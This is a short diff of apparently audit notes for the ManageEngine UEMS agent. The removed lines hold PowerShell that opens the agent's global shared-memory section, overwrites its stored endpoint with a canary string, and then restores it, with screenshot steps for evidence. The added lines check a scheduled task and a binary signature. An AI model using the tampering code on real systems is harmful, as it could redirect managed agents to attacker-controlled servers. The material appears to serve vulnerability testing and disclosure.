@@ -1,27 +1,2 @@
-whoami /groups | Select-String "deny|Medium"
-Screenshot.
-
-Read the original value:
-$map = [IO.MemoryMappedFiles.MemoryMappedFile]::OpenExisting('Global\{7F12ED93-963C-4989-A3BA-602D787B2E3D}')
-$view = $map.CreateViewAccessor()
-$bytes = New-Object byte[] 512
-$view.ReadArray(0, $bytes, 0, 512)
-$original = [Text.Encoding]::Unicode.GetString($bytes).TrimEnd([char]0)
-Write-Host "OriginalEndpoint=$original"
-Screenshot.
-
-Poison it:
-$canaryBytes = [Text.Encoding]::Unicode.GetBytes('UEMS_AUDIT_CANARY')
-$padded = New-Object byte[] 512
-[Array]::Copy($canaryBytes, $padded, $canaryBytes.Length)
-$view.WriteArray(0, $padded, 0, 512)
-$vb = New-Object byte[] 512; $view.ReadArray(0, $vb, 0, 512); Write-Host "PoisonedEndpoint=$([Text.Encoding]::Unicode.GetString($vb).TrimEnd([char]0))"
-Screenshot.
-
-Restore immediately:
-$origBytes = [Text.Encoding]::Unicode.GetBytes($original)
-$restorePad = New-Object byte[] 512
-[Array]::Copy($origBytes, $restorePad, $origBytes.Length)
-$view.WriteArray(0, $restorePad, 0, 512)
-$rb = New-Object byte[] 512; $view.ReadArray(0, $rb, 0, 512); Write-Host "RestoredEndpoint=$([Text.Encoding]::Unicode.GetString($rb).TrimEnd([char]0))"
-$view.Dispose(); $map.Dispose()
+schtasks /query /tn "\DCAgentUpdater" /fo LIST /v | Select-String "Task To Run|Run As User|Status"
+  Get-AuthenticodeSignature "C:\Program Files (x86)\ManageEngine\UEMS_Agent\bin\dcagentupgrader.exe" | Format-List Status
